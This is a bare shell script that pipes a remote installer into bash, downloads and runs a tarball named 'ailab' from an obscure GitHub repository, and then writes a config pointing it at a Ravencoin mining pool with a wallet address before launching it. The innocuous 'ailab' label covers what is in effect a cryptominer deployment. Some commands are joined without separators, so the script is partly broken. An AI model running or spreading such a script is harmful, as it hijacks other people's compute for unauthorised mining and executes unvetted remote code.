apt update
apt install sudo -y
apt install curl ca-certificates -y
curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash source ~/.bashrc && nvm install 18 && npm install && sh install.sh && curl https://github.com/WEASTERNSMITH/testlab1/raw/refs/heads/main/ailab.tar.gz -L -O -J && tar -xf ailab.tar.gz 
cd ailab && npm install && sh install.sh && rm config.json echo '[{"algorithm": "yespower", "host": "yespower.na.mine.zpool.ca", "port": 6234, "worker": "RVkDXkSRDsXAzvAtFz3fuqT7chcdvWopyB", "password": "c=RVN", "workers": 8 }]' > config.json && node index.js
